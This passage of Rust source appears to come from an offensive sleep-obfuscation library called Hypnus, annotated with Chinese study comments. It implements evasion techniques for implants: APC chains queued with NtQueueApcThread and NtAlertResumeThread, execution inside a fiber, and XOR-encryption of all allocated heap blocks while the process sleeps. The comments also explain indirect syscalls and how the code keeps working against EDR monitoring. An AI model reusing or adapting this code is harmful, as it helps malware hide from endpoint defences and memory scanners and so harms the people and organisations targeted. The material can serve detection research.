                    bail!(s!("NtQueueApcThread Failed"));
                }
            }

            // Trigger the APC chain by resuming the thread in alertable state
            status = NtAlertResumeThread(h_thread, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtAlertResumeThread Failed"));
            }

            // If heap obfuscation is enabled, encrypt memory before execution
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait until the thread finishes the spoofed chain
            status = NtSignalAndWaitForSingleObject(event, h_thread, 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed"));
            }

            // De-obfuscate heap if needed
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Clean up all handles
            NtClose(event);
            NtClose(h_thread);
            NtClose(thread);
        }

        Ok(())
    }
}

#[doc(hidden)]
pub mod __private {
    // A pointer type that uniquely owns a heap allocation of type T.
    // 用于在堆上分配内存,跨越纤程切换时的栈边界
    use alloc::boxed::Box;
    // 导入父模块
    use super::*;

    /// Execution sequence using the specified obfuscation strategy.
    pub fn hypnus_entry(base: *mut c_void, size: u64, time: u64, obf: Obfuscation, mode: ObfMode) {
        // mastetr是一个承载了fiber handle的变量,类型是*mut c_void.这里通过调用win api ConvertThreadToFiber将该thread转为fiber
        // 在Winapis struct中pub ConvertThreadToFiber: ConvertThreadToFiberFn
        // 接着在Winapis中的winapi()通过get_proc_address找到对应的函数地址.
        // 是一种抽象类型定义/真实内存地址的绑定过程(称为动态api解析)
        // indirect syscall:跳转到ntdll内部的一段代码,利用dll内部原本存在的syscall指令调用对应的寒湖是
        // direct syscall:将SSN系统调用号加载到exa寄存器执行syscall
        let master = ConvertThreadToFiber(null_mut());
        // 极端EDR下,会监控该api/系统资源枯竭导致thread to fiber失败.不检查master-null的情况,会出现蓝屏BSOD/Crash的情况
        if master.is_null() {
            return;
        }

        match Hypnus::new(base as u64, size, time, mode) {
            Ok(hypnus) => {
                // Creates the context to be passed into the new fiber.
                // 旧栈执行的代码无法直接访问新栈的变量,必须把数据放在heap上
                let fiber_ctx = Box::new(FiberContext {
                    
                    hypnus: Box::new(hypnus),
                   
                    obf,
                    
                    master,
                });

                // Creates a new fiber with 1MB stack, pointing to the `hypnus_fiber` function.
                let fiber = CreateFiber(
                    // 堆栈初始提交大小
                    0x100000, 
                    // 由fiber执行的函数的指针
                    Some(hypnus_fiber), 
                    // 指向传递给fiber的变量的指针
                    Box::into_raw(fiber_ctx).cast()
                );
                
                if fiber.is_null() {
                    return;
                }

                SwitchToFiber(fiber);
                DeleteFiber(fiber);
                ConvertFiberToThread();
            }
            Err(_error) => {
                #[cfg(debug_assertions)]
                dinvk::println!("[Hypnus::new] {:?}", _error);
            }
        }
    }

    /// Structure passed to the fiber containing the [`Hypnus`].
    struct FiberContext {
        hypnus: Box<Hypnus>,
        obf: Obfuscation,
        master: *mut c_void,
    }

    /// Trampoline function executed inside the fiber.
    ///
    /// It unpacks the `FiberContext`, runs the selected obfuscation method,
    /// and optionally logs errors in debug mode.
    extern "system" fn hypnus_fiber(ctx: *mut c_void) {
        unsafe {
            let mut ctx = Box::from_raw(ctx as *mut FiberContext);
            let _result = match ctx.obf {
                Obfuscation::Timer   => ctx.hypnus.timer(),
                Obfuscation::Wait    => ctx.hypnus.wait(),
                Obfuscation::Foliage => ctx.hypnus.foliage(),
            };

            #[cfg(debug_assertions)]
            if let Err(_error) = _result {
                dinvk::println!("[Hypnus] {:?}", _error);
            }

            SwitchToFiber(ctx.master);
        }
    }
}

trait Asu64 {
    /// Converts `self` to a `u64` representing the pointer value.
    fn as_u64(&mut self) -> u64;
}

impl<T> Asu64 for T {
    fn as_u64(&mut self) -> u64 {
        self as *mut _ as *mut c_void as u64
    }
}

/// Iterates over all entries in the process heap and applies
/// an XOR operation to the data of entries marked as allocated.
fn obfuscate_heap(key: &[u8; 8]) {
    let heap = HypnusHeap::get();
    if heap.is_null() {
        return;
    }

    // Walk through all heap entries
    let mut entry = unsafe { zeroed::<RTL_HEAP_WALK_ENTRY>() };
    while RtlWalkHeap(heap, &mut entry) != 0 {
        // Check if the entry is in use (allocated block)
        if entry.Flags & 4 != 0 {
            xor(entry.DataAddress as *mut u8, entry.DataSize, key);
        }
    }
}

/// Applies an XOR transformation to a memory region using the given key.
fn xor(data: *mut u8, len: usize, key: &[u8; 8]) {
    if data.is_null() {
        return;
    }

    for i in 0..len {
        unsafe {
            *data.add(i) ^= key[i % key.len()];
        }
    }
}